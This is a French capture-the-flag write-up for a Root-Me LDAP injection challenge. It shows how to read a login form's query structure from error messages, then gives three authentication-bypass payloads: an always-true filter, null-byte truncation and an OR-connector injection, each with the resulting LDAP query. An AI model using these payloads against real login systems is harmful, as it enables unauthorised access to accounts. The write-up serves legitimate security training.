# LDAP Injection - Authentification

La page deu [challenge](http://challenge01.root-me.org/web-serveur/ch25/)

## Analyse

Pour commencer, on essaye de trouver les champs vulnérable. A la mnaière d'une détection d'injection SQL, on va entrer certains caractères de la syntax des requêtes LDAP, les parenthèses et les symboles logiques & _(and)_ et | _(or)_.
```
LOGIN: a)
PASSWORD: 

ERROR : Invalid LDAP syntax : (&(uid=a))(userPassword=))
```

En enlevant le symbole _a)_, on retrouve le squelette de la requête: `(&(uid=---)(userPassword=---))`. Sans connaitre de noms d'utilisateur ou de mot de passe, on doit faire en sorte de remplacer les _---_ pour que cette requête soit vrai.

La première idée serais d'utiliser le symbole *. Malheuresement le caractères * ne semble pas être accepté.
```
LOGIN: *
PASSWORD: * 

ERROR : Bad characters in password
```

## Attaque 1

On utilise un _"absolute true filter"_, représenté par _(&)_ qui est toujours vrai. Son opposé _"absolute false filter"_ est représenté par _(|)_.
```
LOGIN: *
PASSWORD: *)(&

(&(uid=*)(userPassword=*)(&))
```

## Attaque 2

On peut s'arranger pour tout écrire dans le champs Login, puis couper le reste de la requête LDAP (à la manière d'ajout de symbole pour les commentaires dans le cas des injections SQL). On utilise pour ca du **NULL byte poisoning**.
```
LOGIN: *)(userPassword=*))%00
PASSWORD:

(&(uid=*)(userPassword=*))%00)(userPassword=---))
(&(uid=*)(userPassword=*))
```

## Attaque 3

Même idée que l'attaque 2, mais en jouant avec les connecteurs logique.
```
LOGIN: *)(|(userPassword=*
PASSWORD: p)

( & (uid=*) ( |(userPassword=*)(userPassword=p) ) )
```
